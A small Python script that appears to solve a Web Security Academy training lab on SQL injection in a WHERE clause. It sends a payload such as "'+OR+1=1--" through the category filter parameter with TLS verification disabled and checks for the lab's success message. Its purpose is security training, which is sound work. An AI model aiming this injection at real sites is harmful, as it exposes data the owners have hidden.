import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"

def run(url, payload, proxies=None):
    """
    Executes SQL Injection Lab 1

    Args:
        url (str): Base URL of the lab (e.g., https://site.web-security-academy.net)
        payload (str): SQL injection payload (e.g., "'+OR+1=1--")
        proxies (dict, optional): Proxy config (e.g., for Burp Suite)

    Returns:
        bool: True if injection worked, False otherwise
    """
    if url.endswith('/'):
        url = url[:-1]

    full_url = f"{url}/filter?category={payload}"
    try:
        response = requests.get(full_url, verify=False, proxies=proxies)
        return "Congratulations, you solved the lab!" in response.text
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
